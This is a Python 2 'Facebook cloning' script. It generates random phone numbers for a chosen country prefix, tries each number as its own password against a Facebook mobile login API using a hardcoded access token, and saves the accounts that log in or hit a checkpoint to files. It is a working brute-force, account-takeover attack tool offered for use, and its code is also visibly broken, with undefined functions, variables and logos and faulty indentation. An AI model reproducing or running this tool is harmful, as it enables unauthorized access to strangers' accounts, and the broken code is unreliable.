#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Tech-Aahil
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(1000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 Cloning.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'God by Frends '
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;97m'
R='\033[1;97m'
G='\033[1;97m'
W='\033[1;97m'
S='\033[1;97m'
P='\033[1;97m'
Y='\033[1;97m'
#Dev:rana
##### LOGO #####
logo = """
\033[1;91m░▒███████
\033[1;91m░██▓▒░░▒▓██
\033[1;91m██▓▒░__░▒▓██___██████
\033[1;91m██▓▒░____░▓███▓__░▒▓██
\033[1;91m██▓▒░___░▓██▓_____░▒▓██
\033[1;91m██▓▒░03170424820  ░▒▓██
\033[1;91m_██▓▒░______________░▒▓██
\033[1;91m__██▓▒░_WAQAS___░▒▓██
\033[1;91m___██▓▒░__________░▒▓██
\033[1;91m____██▓▒░________░▒▓██
\033[1;91m_____██▓▒░_____░▒▓██
\033[1;91m______██▓▒░__░▒▓██
\033[1;91m_______█▓▒░░▒▓██
\033[1;91m_________░▒▓██
\033[1;91m_______░▒▓██
\033[1;91m_____░▒▓██
"""
os.system('clear')
	print logo2
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[1]  Bangladesh\033[1;97m☆.\x1b[1;92m[14]  Australia'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[2]  USA       \033[1;97m☆.\x1b[1;92m[15]  Canda'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[3]  UK        \033[1;97m☆.\x1b[1;92m[16]  China'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[4]  India     \033[1;97m☆.\x1b[1;92m[17]  Denmark'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[5]  Brazil    \033[1;97m☆.\x1b[1;92m[18]  France'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[6]  Japan     \033[1;97m☆.\x1b[1;92m[19]  Germany'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[7]  Korea     \033[1;97m☆.\x1b[1;92m[20]  Malaysia'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[8]  Italy     \033[1;97m☆.\x1b[1;92m[21]  Sri lanka'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[9]  Spain     \033[1;97m☆.\x1b[1;92m[22]  Turkey'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[10] Poland    \033[1;97m☆.\x1b[1;92m[23]  U.A.E'
        time.sleep(0.05)
        print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[11] Pakistan  \033[1;97m☆.\x1b[1;92m[24]  Saudi Arabia'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[12] Indonasia \033[1;97m☆.\x1b[1;92m[25]  Israil'
        time.sleep(0.05)
        print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[13] Grecee    \033[1;97m☆.\x1b[1;92m[26]  Iran'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;91m[0]  Back            '
        time.sleep(0.05)
	print 45*'-'
	action()


def action():
	lovehackerx = raw_input('\n\033[1;97mChoose an Option>>> \033[1;97m')
	if lovehackerx =='':
		print '[!] Fill in correctly'
		action()
	elif lovehackerx =="1":
                print (logo53)
		os.system("clear")
		print (logo27)
		print("\033[1;97m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="2":
                print (logo53)
		os.system("clear")
		print (logo28)
		print("\033[1;97m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="3":
                print (logo53)
		os.system("clear")
		print (logo29)
		print("\033[1;97m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790")
		try:
			c = raw_input(" \033[1;97mchoose code  : ")
			k="+44"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="4":
                print (logo53)
		os.system("clear")
		print (logo30)
		print("\033[1;97m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" \033[1;97mchoose code  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="5":
                print (logo53)
		os.system("clear")
		print (logo31)
		print("\033[1;97m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+55"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="6":
                print (logo53)
		os.system("clear")
		print (logo32)
		print("\033[1;97m11, 12, 19, 16, 15, 13, 14, 18, 17")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+81"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="7":
                print (logo53)
		os.system("clear")
		print (logo33)
		print("\033[1;97m1, 2, 3, 4, 5, 6, 7, 8, 9")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+82"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="8":
                print (logo53)
		os.system("clear")
		print (logo34)
		print("\033[1;97m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+39"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="9":
                print (logo53)
		os.system("clear")
		print (logo35)
		print("\033[1;97m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+34"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="10":
                print (logo53)
		os.system("clear")
		print (logo36)
		print("\033[1;97m66, 69, 78, 79, 60, 72, 67, 53, 51")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+48"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="11":
                print (logo53)
		os.system("clear")
		print (logo37)
		print("\033[1;97m01, ~to~~, 49")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="12":
                print (logo53)
		os.system("clear")
		print (logo38)
		print("\033[1;97m81,83,85,84,89,")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="13":
                print (logo53)
		os.system("clear")
		print (logo39)
		print("\033[1;97m(leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.69,693,698,694,695")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+3069"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="14":
                print (logo53)
		os.system("clear")
		print (logo40)
		print("\033[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+61"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="15":
                print (logo53)
		os.system("clear")
		print (logo41)
		print("\033[1;97m(leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="16":
                print (logo53)
		os.system("clear")
		print (logo42)
		print("\033[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,")
		try:
			c = raw_input(" \033[1;97mchoose code  : ")
			k="+86"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="17":
                print (logo53)
		os.system("clear")
		print (logo43)
		print("\033[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8")
		try:
			c = raw_input(" \033[1;97mchoose code  : ")
			k="+45"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="18":
                print (logo53)
		os.system("clear")
		print (logo44)
		print("\033[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+33"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="19":
                print (logo53)
		os.system("clear")
		print (logo45)
		print("\033[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+49"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="20":
                print (logo53)
		os.system("clear")
		print (logo46)
		print("\033[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+60"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="21":
                print (logo53)
		os.system("clear")
		print (logo47)
		print("\033[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+94"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="22":
                print (logo53)
		os.system("clear")
		print (logo48)
		print("\033[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+90"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="23":
                print (logo53)
		os.system("clear")
		print (logo49)
		print("\033[1;97m(leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+971"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="24":
                print (logo53)
		os.system("clear")
		print (logo50)
		print("\033[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+966"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="25":
                print (logo53)
		os.system("clear")
		print (logo51)
		print("\033[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+972"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="26":
                print (logo53)
		os.system("clear")
		print (logo52)
		print("\033[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+98"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =='0':
		login()
	else:
		print '[!] Fill in correctly'
		action()

	xxx = str(len(id))
	jalan ('[✓] Total Numbers: '+xxx)
	time.sleep(0.05)
	jalan(' \033[1;97mPlz Wait Cloned Accounts Will Appear Here')
	time.sleep(0.05)
	jalan ('[!] To Stop Process Press CTRL Then Press z')
	time.sleep(0.05)
	print 44*'-'
	print (logo13)
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[live  ok]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[Error CP] ' + k + c + user + ' -•◈•- ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
#				else:
#				    pass2="ComingSoon"
#				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
#				    q = json.load(data)
#				    if 'access_token' in q:
#				        print '\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass2+'\n'+"\n"
#				        okb = open('save/successfull.txt', 'a')
#				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
#				        okb.close()
#				        oks.append(c+user+pass2)
#				    else:
#				        if 'www.facebook.com' in q['error_msg']:
#					        print '[Checkpoint] ' + k + c + user + ' -•◈•- ' + pass2+'\n'
#					        cps = open('save/checkpoint.txt', 'a')
#					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
#					        cps.close()
#					        cpb.append(c+user+pass2)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 44*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	print """
\033[1;91m     ♦♦♦———————————————————————————————♦♦♦
\033[1;97m        ___    ___   _   _ _____ _     
\033[1;92m       / _ \  / _ \ | | | |_   _| | Updated 9.2 ✔ 
\033[1;97m      / /_\ \/ /_\ \| |_| | | | | |    
\033[1;92m      |  _  ||  _  ||  _  | | | | |    
\033[1;97m      | | | || | | || | | |_| |_| |____
\033[1;97m      \_| |_/\_| |_/\_| |_/\___/\_____/
\033[1;91m     ♦♦♦———————————————————————————————♦♦♦
 
 Don't Worry Your Error cp ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;97m ....Tech-Aahil...... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;97m Aahil"""
	
	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
	login()	
          
if __name__ == '__main__':
	login()
